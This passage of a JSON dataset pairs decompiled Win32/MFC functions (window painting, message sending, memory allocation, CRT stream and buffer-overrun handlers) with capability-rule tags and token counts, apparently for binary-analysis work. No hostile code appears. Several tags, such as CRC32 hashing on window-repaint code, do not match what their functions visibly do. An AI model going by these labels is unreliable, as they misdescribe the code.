        "decompiled_code": "\nvoid __cdecl fcn.0043bebc(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    int32_t lpRect;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_DefWindowProcA)(*(in_ECX + 0x1c), 0x46, 0, arg_8h);\n    if ((*(arg_8h + 0x18) & 1) == 0) {\n        (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &lpRect);\n        var_4h = *(arg_8h + 0x10);\n        var_ch = var_ch - lpRect;\n        var_8h = var_8h - var_10h;\n        iVar1 = *(arg_8h + 0x14);\n        if ((var_4h != var_ch) && ((*(in_ECX + 0x7d) & 4) != 0)) {\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, var_4h - *0x466db8, 0, var_4h, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), &lpRect, 1);\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, var_ch - *0x466db8, 0, var_ch, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), &lpRect, 1);\n        }\n        pcVar2 = _sym.imp.USER32.dll_SetRect;\n        if ((iVar1 != var_8h) && ((*(in_ECX + 0x7d) & 8) != 0)) {\n            (*_sym.imp.USER32.dll_SetRect)(&lpRect, 0, iVar1 - *0x466dbc, var_4h, iVar1);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), &lpRect, 1);\n            (*pcVar2)(&lpRect, 0, var_8h - *0x466dbc, var_4h, var_8h);\n            (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), &lpRect, 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 580
    },
    "0043fddc": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0043fddc(int32_t param_1, uint32_t param_2)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar3 = fcn.0042dd19();\n    iVar4 = param_1;\n    if ((uVar3 & 0x40000000) == 0) {\n        iVar4 = fcn.0042bf1b();\n    }\n    pcVar2 = _sym.imp.USER32.dll_SendMessageA;\n    if ((param_2 & 0xc) != 0) {\n        iVar5 = fcn.0042de5f();\n        if ((((~(param_2 >> 3) & 1) == 0) || (iVar5 == 0)) || (iVar4 == param_1)) {\n            (*pcVar2)(*(iVar4 + 0x1c), 0x86, 0, 0);\n        }\n        else {\n            *(param_1 + 0x39) = *(param_1 + 0x39) | 2;\n            (*pcVar2)(*(iVar4 + 0x1c), 0x86, 1, 0);\n            *(param_1 + 0x39) = *(param_1 + 0x39) & 0xfd;\n        }\n    }\n    uVar7 = 5;\n    iVar5 = (*_sym.imp.USER32.dll_GetDesktopWindow)(5);\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    while (iVar5 = (*pcVar1)(iVar5, uVar7),  iVar5 != 0) {\n        iVar6 = fcn.0043f7c2(*(iVar4 + 0x1c), iVar5);\n        if (iVar6 != 0) {\n            (*pcVar2)(iVar5, 0x36d, param_2, 0);\n        }\n        uVar7 = 2;\n    }\n    return;\n}\n",
        "token_count": 470
    },
    "004427a6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004427a6(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    ulong uVar2;\n    uint var_4h;\n    \n    if ((~*(arg_8h + 0x18) & 1) == 0) {\n        uVar2 = (**(**(arg_8h + 0x24) + 0x30))();\n        uVar1 = fcn.004102cb();\n        if ((uVar2 >> 0x20 != 0) || (uVar1 < uVar2)) {\n            fcn.00438754(0xf105, 0, 0xffffffff);\n            fcn.00433064();\n        }\n        fcn.004421b9(arg_8h, uVar2);\n    }\n    else {\n        fcn.00442748(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 198
    },
    "004438a4": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004438a4(uint32_t arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = fcn.0042dd19();\n    pcVar1 = _sym.imp.USER32.dll_GetKeyState;\n    if ((uVar3 < 0) &&\n       ((((arg_8h & 0xfff0) != 0xf060 ||\n         (((iVar2 = (*_sym.imp.USER32.dll_GetKeyState)(0x73),  iVar2 < 0 && (iVar2 = (*pcVar1)(0x12),  iVar2 < 0)) &&\n          ((uVar3 & 0x100) != 0)))) && (iVar4 = fcn.0042c72e(arg_8h, arg_ch),  iVar4 != 0)))) {\n        return;\n    }\n    fcn.004403e6(arg_8h, arg_ch);\n    return;\n}\n",
        "token_count": 228
    },
    "00446000": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00446000(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    int32_t iVar2;\n    code *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint8_t *puVar6;\n    int32_t iVar7;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t iStack40;\n    uint uStack36;\n    int32_t iStack32;\n    int32_t iStack28;\n    uint hMem;\n    uint lpCriticalSection;\n    \n    iVar4 = param_1 + 0x1c;\n    iStack32 = 0x446017;\n    iStack28 = iVar4;\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)();\n    iVar2 = *(param_1 + 4);\n    iVar7 = *(param_1 + 8);\n    if ((iVar2 <= iVar7) || ((*(*(param_1 + 0x10) + iVar7 * 8) & 1) != 0)) {\n        iVar7 = 1;\n        if (1 < iVar2) {\n            puVar6 = *(param_1 + 0x10);\n            do {\n                puVar6 = puVar6 + 8;\n                if ((*puVar6 & 1) == 0) break;\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < iVar2);\n            if (iVar7 < iVar2) goto code_r0x004460e2;\n        }\n        iVar2 = iVar2 + 0x20;\n        iStack32 = *(param_1 + 0x10);\n        if (iStack32 == 0) {\n            iStack32 = iVar2 * 8;\n            uStack36 = 2;\n            iStack40 = 0x446068;\n            iStack40 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)();\n        }\n        else {\n            uStack36 = 0x446071;\n            uStack48 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n            iStack40 = 0x44607b;\n            uStack36 = uStack48;\n            (*_sym.imp.KERNEL32.dll_GlobalUnlock)();\n            iStack40 = 0x2002;\n            puStack44 = iVar2 * 8;\n            iStack40 = (*_sym.imp.KERNEL32.dll_GlobalReAlloc)();\n        }\n        if (iStack40 == 0) {\n            iStack40 = *(param_1 + 0x10);\n            if (iStack40 != 0) {\n                puStack44 = 0x4460a1;\n                puStack44 = (*_sym.imp.KERNEL32.dll_GlobalHandle)();\n                uStack48 = 0x4460a8;\n                (*_sym.imp.KERNEL32.dll_GlobalLock)();\n            }\n            puStack44 = 0x4460b1;\n            iStack40 = iVar4;\n            (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n            uStack48 = 0x4650a0;\n            puStack44 = &stack0xfffffffc;\n            fcn.00411d3b(&stack0xffffffd0, 0x45d154);\n            pcVar3 = swi(3);\n            iVar4 = (*pcVar3)();\n            return iVar4;\n        }\n        puStack44 = 0x4460bd;\n        iVar5 = (*_sym.imp.KERNEL32.dll_GlobalLock)();\n        iStack32 = (iVar2 - *(param_1 + 4)) * 8;\n        iStack40 = iVar5 + *(param_1 + 4) * 8;\n        uStack36 = 0;\n        puStack44 = 0x4460d6;\n        fcn.00411850();\n        *(param_1 + 4) = iVar2;\n        *(param_1 + 0x10) = iVar5;\n    }\ncode_r0x004460e2:\n    if (*(param_1 + 0xc) <= iVar7) {\n        *(param_1 + 0xc) = iVar7 + 1;\n    }\n    puVar1 = *(param_1 + 0x10) + iVar7 * 8;\n    *puVar1 = *puVar1 | 1;\n    *(param_1 + 8) = iVar7 + 1;\n    uStack36 = 0x446105;\n    iStack32 = iVar4;\n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)();\n    return iVar7;\n}\n",
        "token_count": 987
    },
    "004039a0": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_28h\n\nuint32_t fcn.004039a0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_18h;\n    uchar auStack256 [208];\n    uint uStack48;\n    uint var_28h;\n    uint var_1ch;\n    uint var_18h_2;\n    uint var_10h;\n    code *pcStack16;\n    uint uStack12;\n    uint var_4h;\n    \n    uStack12 = 0x44ec38;\n    pcStack16 = fcn.00411190;\n    var_10h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.004039a0::var_10h;\n    var_4h = 0;\n    uStack48 = 0x4039df;\n    fcn.004112a0();\n    *in_FS_OFFSET = var_10h;\n    return &stack0xffffff00 | 1;\n}\n",
        "token_count": 223
    },
    "004184d7": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h_2\n\nvoid __cdecl fcn.004184d7(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBP;\n    char *pcVar4;\n    uint var_8h;\n    uint var_ch;\n    uint var_128h_2;\n    uint var_124h_2;\n    uint var_128h;\n    uint lpFilename;\n    uint var_18h_2;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack4;\n    \n    uStack4 = 0x118;\n    var_18h = 0x4565d8;\n    fcn.00412580();\n    *(unaff_EBP + -0x1c) = *0x4640c8;\n    pcVar1 = *0x467394;\n    if (*0x467394 == NULL) {\n        if (*(unaff_EBP + 8) == 1) {\n            pcVar4 = \"Buffer overrun detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A buffer overrun has been detected which has corrupted the program\\'s\\ninternal state.  The program cannot safely continue execution and must\\nnow be terminated.\\n\"\n            ;\n        }\n        else {\n            pcVar4 = \"Unknown security failure detected!\";\n            *(unaff_EBP + -0x128) =\n                 \"A security error of unknown cause has been detected which has\\ncorrupted the program\\'s internal state.  The program cannot safely\\ncontinue execution and must now be terminated.\\n\"\n            ;\n        }\n        *(unaff_EBP + -0x20) = 0;\n        iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, unaff_EBP + -0x124, 0x104);\n        if (iVar2 == 0) {\n            fcn.004190f0(unaff_EBP + -0x124, \"<program name unknown>\");\n        }\n        iVar2 = unaff_EBP + -0x124;\n        iVar3 = fcn.00411cb0(iVar2);\n        if (0x3c < iVar3 + 0xbU) {\n            iVar2 = fcn.00411cb0(iVar2);\n            iVar2 = iVar2 + unaff_EBP + -0x155;\n            fcn.0041c4a0(iVar2, 0x4563f8, 3);\n        }\n        fcn.00411cb0(iVar2);\n        fcn.004112a0();\n        *(unaff_EBP + -0x18) = &var_18h;\n        fcn.004190f0(&var_18h, pcVar4);\n        fcn.00419100(&var_18h, 0x4563d8);\n        fcn.00419100(&var_18h, \"Program: \");\n        fcn.00419100(&var_18h, iVar2);\n        fcn.00419100(&var_18h, 0x4563d8);\n        fcn.00419100(&var_18h, *(unaff_EBP + -0x128));\n        fcn.0041c3a0(&var_18h, \"Microsoft Visual C++ Runtime Library\", 0x12010);\n    }\n    else {\n        *(unaff_EBP + -4) = 0;\n        (*pcVar1)(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n        *(unaff_EBP + -4) = 0xffffffff;\n    }\n    fcn.004123d5(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 908
    },
    "00426eb3": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n\nuint __cdecl fcn.00426eb3(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t in_ECX;\n    uint32_t uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint var_14h;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    puStack28 = &var_8h;\n    uStack32 = 0;\n    uStack36 = 0x434;\n    uStack40 = *(in_ECX + 0x1c);\n    var_4h = 0;\n    var_8h = 0;\n    (*_sym.imp.USER32.dll_SendMessageA)();\n    fcn.004112a0();\n    uStack40 = uStack40 & 0xffffff00;\n    (*pcVar1)(*(in_ECX + 0x1c), 0x43e, 0, &uStack40);\n    fcn.00401ce0(&uStack40);\n    return arg_8h;\n}\n",
        "token_count": 263
    },
    "00405690": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00405690(int32_t param_1, uint param_2, uint param_3, int32_t param_4)\n\n{\n    int32_t iVar1;\n    \n    *(param_1 + 0x50) = param_2;\n    *(param_1 + 0x54) = param_3;\n    if (param_4 == -1) {\n        param_4 = (*_sym.imp.USER32.dll_GetSysColor)(0xd);\n    }\n    *(param_1 + 0x58) = param_4;\n    iVar1 = (*_sym.imp.USER32.dll_IsWindow)(*(param_1 + 0x1c));\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_InvalidateRect)(*(param_1 + 0x1c), 0, 1);\n    }\n    return;\n}\n",
        "token_count": 194
    },
    "004059a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004059a0(char **param_1, char *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    code *pcVar3;\n    \n    if (param_2 == 0xffffffff) {\n        param_2 = *param_1;\n        if (param_2 != NULL) {\n            pcVar1 = param_2 + 1;\n            do {\n                cVar2 = *param_2;\n                param_2 = param_2 + 1;\n            } while (cVar2 != '\\0');\n            param_2 = param_2 + -pcVar1;\n            goto code_r0x004059bc;\n        }\n    }\n    else {\ncode_r0x004059bc:\n        if (param_2 < 0) goto code_r0x004059d4;\n    }\n    if (param_2 <= *(*param_1 + -8)) {\n        *(*param_1 + -0xc) = param_2;\n        param_2[*param_1] = '\\0';\n        return;\n    }\ncode_r0x004059d4:\n    fcn.00401100(0x80070057);\n    pcVar3 = swi(3);\n    (*pcVar3)();\n    return;\n}\n",
        "token_count": 279
    },
    "004084f0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004084f0(int32_t param_1, int32_t param_2)\n\n{\n    *(param_1 + 0xf8) = param_2;\n    *(param_1 + 0x104) = param_2 != -1;\n    fcn.00408070();\n    return param_1;\n}\n",
        "token_count": 79
    },
    "0040fab4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0040fab4(int32_t arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint *in_ECX;\n    int64_t iVar1;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_4h;\n    \n    var_24h = arg_1ch;\n    var_20h = arg_18h;\n    var_1ch = arg_14h;\n    var_18h = arg_10h;\n    var_14h = arg_ch + -1;\n    var_10h = arg_8h + -0x76c;\n    var_4h = arg_20h;\n    iVar1 = fcn.004134ca(&var_24h);\n    *in_ECX = iVar1;\n    in_ECX[1] = iVar1 >> 0x20;\n    if (iVar1 == -1) {\n        fcn.00401100(0x80070057);\n    }\n    return;\n}\n",
        "token_count": 279
    },
    "00411190": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00411190(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.00417708(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.00410cf0(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.00410d32(param_2, iVar5);\n                        fcn.00410dc6(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.00410d32(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 511
    },
    "004146b9": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid fcn.004146b9(int32_t param_1)\n\n{\n    if (*0x464364 != -1) {\n        if (param_1 == 0) {\n            param_1 = (**0x4670d4)(*0x464364);\n        }\n        fcn.00414572(param_1);\n        (**0x4670d8)(*0x464364, 0);\n    }\n    return;\n}\n",
        "token_count": 94
    },
    "0041b9f1": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t fcn.0041b9f1(uint8_t **param_1)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    \n    puVar3 = param_1[3];\n    if (((puVar3 & 0x83) != 0) && ((puVar3 & 0x40) == 0)) {\n        if ((puVar3 & 2) == 0) {\n            param_1[3] = puVar3 | 1;\n            if ((puVar3 & 0x10c) == 0) {\n                fcn.0041c012(param_1);\n            }\n            else {\n                *param_1 = param_1[2];\n            }\n            puVar3 = fcn.0041fbdf(param_1[4], param_1[2], param_1[6]);\n            param_1[1] = puVar3;\n            if ((puVar3 != NULL) && (puVar3 != 0xffffffff)) {\n                if ((param_1[3] & 0x82) == 0) {\n                    puVar2 = param_1[4];\n                    if (puVar2 == 0xffffffff) {\n                        iVar4 = 0x4645e0;\n                    }\n                    else {\n                        iVar4 = *((puVar2 >> 5) * 4 + 0x4685e0) + (puVar2 & 0x1f) * 0x24;\n                    }\n                    if ((*(iVar4 + 4) & 0x82) == 0x82) {\n                        param_1[3] = param_1[3] | 0x2000;\n                    }\n                }\n                if (((param_1[6] == 0x200) && ((param_1[3] & 8) != 0)) && ((param_1[3] & 0x400) == 0)) {\n                    param_1[6] = 0x1000;\n                }\n                param_1[1] = puVar3 + -1;\n                uVar1 = **param_1;\n                *param_1 = *param_1 + 1;\n                return uVar1;\n            }\n            param_1[3] = param_1[3] | (-(puVar3 != NULL) & 0x10) + 0x10;\n            param_1[1] = NULL;\n        }\n        else {\n            param_1[3] = puVar3 | 0x20;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 583
    },
    "0041c6d4": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041c6d4(uint32_t arg_8h, uint8_t **arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_ch;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    if ((*(arg_ch + 3) & 0x40) == 0) {\n        puVar2 = arg_ch[4];\n        if (puVar2 == 0xffffffff) {\n            iVar3 = 0x4645e0;\n        }\n        else {\n            iVar3 = *((puVar2 >> 5) * 4 + 0x4685e0) + (puVar2 & 0x1f) * 0x24;\n        }\n        if ((*(iVar3 + 4) & 0x80) != 0) {\n            iVar3 = fcn.0041c247(&var_ch, arg_8h);\n            if (iVar3 == -1) {\n                puVar4 = fcn.004131f5();\n                *puVar4 = 0x2a;\n            }\n            else {\n                iVar6 = 0;\n                if (0 < iVar3) {\n                    do {\n                        ppuVar1 = arg_ch + 1;\n                        *ppuVar1 = *ppuVar1 + -1;\n                        if (*ppuVar1 < 0) {\n                            uVar5 = fcn.00415afa(*(&var_ch + iVar6), arg_ch);\n                        }\n                        else {\n                            **arg_ch = *(&var_ch + iVar6);\n                            uVar5 = **arg_ch;\n                            *arg_ch = *arg_ch + 1;\n                        }\n                    } while ((uVar5 != 0xffffffff) && (iVar6 = iVar6 + 1,  iVar6 < iVar3));\n                }\n            }\n            goto code_r0x0041c79d;\n        }\n    }\n    ppuVar1 = arg_ch + 1;\n    *ppuVar1 = *ppuVar1 + -2;\n    if (*ppuVar1 < 0) {\n        fcn.00420460(arg_8h & 0xffff, arg_ch);\n    }\n    else {\n        **arg_ch = arg_8h;\n        *arg_ch = *arg_ch + 2;\n    }\ncode_r0x0041c79d:\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 572
    },
    "0042424a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0042424a(uint arg_8h, uint *arg_ch)\n\n{\n    uint *puVar1;\n    int32_t *in_ECX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_30h;\n    int32_t var_10h;\n    int32_t var_ch;\n    \n    puVar1 = arg_ch;\n    puVar3 = &var_30h;\n    for (iVar2 = 0xc; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = *puVar1;\n        puVar1 = puVar1 + 1;\n        puVar3 = puVar3 + 1;\n    }\n    if (((var_10h == 0) && (var_ch != -1)) && (var_ch != 0)) {\n        iVar2 = fcn.00428174(var_ch, &arg_ch);\n        if (iVar2 == 0) {\n            puVar1 = fcn.0042834a(var_ch);\n            *puVar1 = 0;\n        }\n        fcn.0042819b(var_ch, &var_ch);\n    }\n    (**(*in_ECX + 0x110))(0x404, arg_8h, &var_30h);\n    return;\n}\n",
        "token_count": 288
    },
    "00425cae": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: nWidth\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: nHeight\n\nvoid __cdecl fcn.00425cae(uint wParam)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint nWidth;\n    uint nHeight;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    if (*(unaff_EBP + 8) != -1) {\n        uVar2 = fcn.0043f149();\n        (*_sym.imp.USER32.dll_GetClientRect)(*(extraout_ECX + 0x1c), unaff_EBP + -0x24);\n        *(unaff_EBP + -0x10) = 0;\n        *(unaff_EBP + -0x14) = vtable.CRgn.0;\n        *(unaff_EBP + -4) = 0;\n        uVar3 = (*_sym.imp.GDI32.dll_CreateRectRgnIndirect)(unaff_EBP + -0x24);\n        fcn.00433a59(uVar3);\n        uVar3 = (*_sym.imp.USER32.dll_GetDC)(*(extraout_ECX + 0x1c));\n        iVar4 = fcn.0043374e(uVar3);\n        fcn.00433387(unaff_EBP + -0x14);\n        (*_sym.imp.USER32.dll_SendMessageA)(*(extraout_ECX + 0x1c), 0x198, *(unaff_EBP + 8), unaff_EBP + -0x24);\n        iVar1 = *(unaff_EBP + -0x20);\n        *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + -2;\n        *(unaff_EBP + -0x18) = iVar1 + 2;\n        uVar2 = fcn.00433bad(uVar2);\n        (*_sym.imp.GDI32.dll_PatBlt)\n                  (*(iVar4 + 4), *(unaff_EBP + -0x24), *(unaff_EBP + -0x20), *(unaff_EBP + -0x1c) - *(unaff_EBP + -0x24)\n                   , *(unaff_EBP + -0x18) - *(unaff_EBP + -0x20), 0x5a0049);\n        fcn.00433bad(uVar2);\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(extraout_ECX + 0x1c), *(iVar4 + 4));\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x14) = vtable.CGdiObject.0;\n        fcn.00433ab0();\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 732
    },
    "00425fc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425fc0(uint arg_8h, uint arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t in_ECX;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    int32_t var_ch;\n    \n    var_14h = arg_ch;\n    var_1ch = arg_10h;\n    var_20h = 5;\n    if (arg_14h != -1) {\n        var_20h = 7;\n        var_18h = arg_14h;\n    }\n    if (arg_18h != -1) {\n        var_20h = var_20h | 8;\n        var_ch = arg_18h;\n    }\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x1c), 0x101b, arg_8h, &var_20h);\n    return;\n}\n",
        "token_count": 236
    },
    "00427ea0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00427ea0(int32_t param_1, int32_t **param_2, int32_t *param_3, int32_t *param_4)\n\n{\n    int32_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 != NULL) {\n        if (piVar3 == 0xffffffff) {\n            uVar4 = 0;\n            if (*(param_1 + 8) != 0) {\n                ppiVar1 = *(param_1 + 4);\n                while (piVar3 = *ppiVar1,  piVar3 == NULL) {\n                    uVar4 = uVar4 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                    if (*(param_1 + 8) <= uVar4) {\n                        *param_2 = NULL;\n                        return;\n                    }\n                }\n            }\n        }\n        piVar5 = *piVar3;\n        if (piVar5 == NULL) {\n            uVar4 = *(param_1 + 8);\n            uVar2 = (piVar3[1] >> 4) % uVar4 + 1;\n            if (uVar2 < uVar4) {\n                ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n                do {\n                    piVar5 = *ppiVar1;\n                    if (piVar5 != NULL) break;\n                    uVar2 = uVar2 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                } while (uVar2 < uVar4);\n            }\n        }\n        *param_2 = piVar5;\n        *param_3 = piVar3[1];\n        *param_4 = piVar3[2];\n    }\n    return;\n}\n",
        "token_count": 435
    },
    "004282cf": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004282cf(int32_t param_1, int32_t **param_2, int32_t *param_3)\n\n{\n    int32_t **ppiVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    uint32_t uVar4;\n    int32_t *piVar5;\n    \n    piVar3 = *param_2;\n    if (piVar3 != NULL) {\n        if (piVar3 == 0xffffffff) {\n            uVar4 = 0;\n            if (*(param_1 + 8) != 0) {\n                ppiVar1 = *(param_1 + 4);\n                while (piVar3 = *ppiVar1,  piVar3 == NULL) {\n                    uVar4 = uVar4 + 1;\n                    ppiVar1 = ppiVar1 + 1;\n                    if (*(param_1 + 8) <= uVar4) {\n                        *param_2 = NULL;\n                        return;\n                    }\n                }\n            }\n        }\n        piVar5 = *piVar3;\n        if (piVar5 == NULL) {\n            uVar4 = *(param_1 + 8);\n            uVar2 = piVar3[1] % uVar4 + 1;\n            if (uVar2 < uVar4) {\n                ppiVar1 = *(param_1 + 4) + uVar2 * 4;\n                do {\n                    piVar5 = *ppiVar1;\n                    if (piVar5 != NULL) break;\n                    uVar2 = uVar2 